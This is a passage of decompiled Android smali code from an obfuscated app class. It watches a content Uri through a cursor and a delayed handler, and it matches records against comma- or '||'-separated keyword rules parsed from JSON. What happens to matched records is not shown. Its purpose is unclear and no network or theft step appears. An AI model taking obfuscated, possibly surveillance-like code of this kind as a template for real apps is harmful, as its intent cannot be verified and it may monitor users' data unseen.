    if-eqz v0, :cond_0

    iget-object v0, p2, Lcom/boJUF/mB/mB/pO/mB/XQ;->LA:Ljava/lang/String;

    invoke-virtual {p3}, Lcom/boJUF/mB/mB/pO/mB/Lr;->IL()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-direct {p0, p3, p2}, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->LA(Lcom/boJUF/mB/mB/pO/mB/Lr;Lcom/boJUF/mB/mB/pO/mB/XQ;)V

    goto :goto_0

    :cond_2
    const-string v0, "\uff0c"

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_3

    const-string v0, "\uff0c"

    invoke-virtual {p1, v0}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    iget-object v1, p2, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    aget-object v2, v0, v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_0

    iget-object v1, p2, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    aget-object v0, v0, v3

    invoke-virtual {v1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p2, Lcom/boJUF/mB/mB/pO/mB/XQ;->LA:Ljava/lang/String;

    invoke-virtual {p3}, Lcom/boJUF/mB/mB/pO/mB/Lr;->IL()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-direct {p0, p3, p2}, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->LA(Lcom/boJUF/mB/mB/pO/mB/Lr;Lcom/boJUF/mB/mB/pO/mB/XQ;)V

    goto :goto_0

    :cond_3
    iget-object v0, p2, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    invoke-virtual {v0, p1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p2, Lcom/boJUF/mB/mB/pO/mB/XQ;->LA:Ljava/lang/String;

    invoke-virtual {p3}, Lcom/boJUF/mB/mB/pO/mB/Lr;->IL()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-direct {p0, p3, p2}, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->LA(Lcom/boJUF/mB/mB/pO/mB/Lr;Lcom/boJUF/mB/mB/pO/mB/XQ;)V

    goto :goto_0
.end method

.method static synthetic Lx()Landroid/os/Handler;
    .locals 1

    sget-object v0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->TP:Landroid/os/Handler;

    return-object v0
.end method

.method static synthetic On(Lcom/boJUF/mB/mB/pO/JO/tP/ac;)Landroid/content/Context;
    .locals 1

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->rC:Landroid/content/Context;

    return-object v0
.end method

.method static synthetic TP(Lcom/boJUF/mB/mB/pO/JO/tP/ac;)Landroid/database/Cursor;
    .locals 1

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->gj:Landroid/database/Cursor;

    return-object v0
.end method

.method static synthetic VY()Landroid/os/Handler;
    .locals 1

    sget-object v0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->TP:Landroid/os/Handler;

    return-object v0
.end method

.method static synthetic bh()Landroid/os/Handler;
    .locals 1

    sget-object v0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->TP:Landroid/os/Handler;

    return-object v0
.end method

.method static synthetic cp(Lcom/boJUF/mB/mB/pO/JO/tP/ac;)Landroid/net/Uri;
    .locals 1

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->VY:Landroid/net/Uri;

    return-object v0
.end method

.method static synthetic gj()Landroid/os/Handler;
    .locals 1

    sget-object v0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->TP:Landroid/os/Handler;

    return-object v0
.end method

.method static synthetic na()I
    .locals 1

    sget v0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->Ab:I

    return v0
.end method

.method static synthetic na(Lcom/boJUF/mB/mB/pO/JO/tP/ac;)J
    .locals 2

    iget-wide v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->uv:J

    return-wide v0
.end method

.method static synthetic oC()I
    .locals 1

    sget v0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->Hm:I

    return v0
.end method

.method static synthetic rC()I
    .locals 1

    sget v0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->Jl:I

    return v0
.end method

.method static synthetic sj()Landroid/os/Handler;
    .locals 1

    sget-object v0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->TP:Landroid/os/Handler;

    return-object v0
.end method


# virtual methods
.method public final LA(Ljava/util/List;Ljava/util/List;)V
    .locals 8

    if-eqz p1, :cond_0

    :try_start_0
    invoke-interface {p1}, Ljava/util/List;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_1

    :cond_0
    :goto_0
    return-void

    :cond_1
    if-eqz p2, :cond_0

    invoke-interface {p2}, Ljava/util/List;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_0

    invoke-interface {p1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :cond_2
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lcom/boJUF/mB/mB/pO/mB/XQ;

    invoke-interface {p2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :cond_3
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-eqz v1, :cond_2

    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Lcom/boJUF/mB/mB/pO/mB/ji;

    new-instance v4, Lorg/json/JSONObject;

    invoke-virtual {v1}, Lcom/boJUF/mB/mB/pO/mB/ji;->na()Ljava/lang/String;

    move-result-object v5

    invoke-direct {v4, v5}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4}, Lorg/json/JSONObject;->keys()Ljava/util/Iterator;

    move-result-object v4

    if-eqz v4, :cond_3

    :cond_4
    :goto_1
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    if-eqz v5, :cond_3

    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v5

    const-string v6, ","

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_5

    const-string v6, ","

    invoke-virtual {v5, v6}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v5

    iget-object v6, v0, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    const/4 v7, 0x0

    aget-object v7, v5, v7

    invoke-virtual {v6, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_4

    iget-object v6, v0, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    const/4 v7, 0x1

    aget-object v5, v5, v7

    invoke-virtual {v6, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_4

    iget-object v5, v0, Lcom/boJUF/mB/mB/pO/mB/XQ;->LA:Ljava/lang/String;

    invoke-virtual {v1}, Lcom/boJUF/mB/mB/pO/mB/ji;->TP()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_4

    invoke-direct {p0, v1, v0}, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->LA(Lcom/boJUF/mB/mB/pO/mB/ji;Lcom/boJUF/mB/mB/pO/mB/XQ;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0

    :cond_5
    :try_start_1
    const-string v6, "\uff0c"

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_6

    const-string v6, "\uff0c"

    invoke-virtual {v5, v6}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v5

    iget-object v6, v0, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    const/4 v7, 0x0

    aget-object v7, v5, v7

    invoke-virtual {v6, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_4

    iget-object v6, v0, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    const/4 v7, 0x1

    aget-object v5, v5, v7

    invoke-virtual {v6, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_4

    iget-object v5, v0, Lcom/boJUF/mB/mB/pO/mB/XQ;->LA:Ljava/lang/String;

    invoke-virtual {v1}, Lcom/boJUF/mB/mB/pO/mB/ji;->TP()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_4

    invoke-direct {p0, v1, v0}, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->LA(Lcom/boJUF/mB/mB/pO/mB/ji;Lcom/boJUF/mB/mB/pO/mB/XQ;)V

    goto :goto_1

    :cond_6
    iget-object v6, v0, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    invoke-virtual {v6, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_4

    iget-object v5, v0, Lcom/boJUF/mB/mB/pO/mB/XQ;->LA:Ljava/lang/String;

    invoke-virtual {v1}, Lcom/boJUF/mB/mB/pO/mB/ji;->TP()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_4

    invoke-direct {p0, v1, v0}, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->LA(Lcom/boJUF/mB/mB/pO/mB/ji;Lcom/boJUF/mB/mB/pO/mB/XQ;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_1
.end method

.method public final LA(Ljava/util/List;Ljava/util/List;I)V
    .locals 8

    if-eqz p1, :cond_0

    :try_start_0
    invoke-interface {p1}, Ljava/util/List;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_1

    :cond_0
    :goto_0
    return-void

    :cond_1
    if-eqz p2, :cond_0

    invoke-interface {p2}, Ljava/util/List;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_0

    invoke-interface {p1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :cond_2
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lcom/boJUF/mB/mB/pO/mB/XQ;

    invoke-interface {p2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v4

    :cond_3
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-eqz v1, :cond_2

    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Lcom/boJUF/mB/mB/pO/mB/Lr;

    new-instance v2, Lorg/json/JSONObject;

    invoke-virtual {v1}, Lcom/boJUF/mB/mB/pO/mB/Lr;->Lx()Ljava/lang/String;

    move-result-object v5

    invoke-direct {v2, v5}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Lorg/json/JSONObject;->keys()Ljava/util/Iterator;

    move-result-object v5

    if-eqz v5, :cond_3

    :cond_4
    :goto_1
    invoke-interface {v5}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_3

    invoke-interface {v5}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v6, "\\|\\|"

    invoke-virtual {v2, v6}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v6

    if-eqz v6, :cond_5

    array-length v7, v6

    if-lez v7, :cond_5

    const/4 v2, 0x0

    :goto_2
    array-length v7, v6

    if-ge v2, v7, :cond_4

    aget-object v7, v6, v2

    invoke-direct {p0, v7, v0, v1, p3}, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->LA(Ljava/lang/String;Lcom/boJUF/mB/mB/pO/mB/XQ;Lcom/boJUF/mB/mB/pO/mB/Lr;I)V

    add-int/lit8 v2, v2, 0x1

    goto :goto_2

    :cond_5
    invoke-direct {p0, v2, v0, v1, p3}, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->LA(Ljava/lang/String;Lcom/boJUF/mB/mB/pO/mB/XQ;Lcom/boJUF/mB/mB/pO/mB/Lr;I)V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0
.end method

.method public final TP()V
    .locals 4

    sget-object v0, Lcom/boJUF/mB/mB/tP/uI;->A:Ljava/lang/String;

    invoke-virtual {p0}, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->cp()V

    sget-object v0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->TP:Landroid/os/Handler;

    iget-object v1, p0, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->YM:Ljava/lang/Runnable;

    sget v2, Lcom/boJUF/mB/mB/pO/JO/tP/ac;->Ab:I

    int-to-long v2, v2

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method
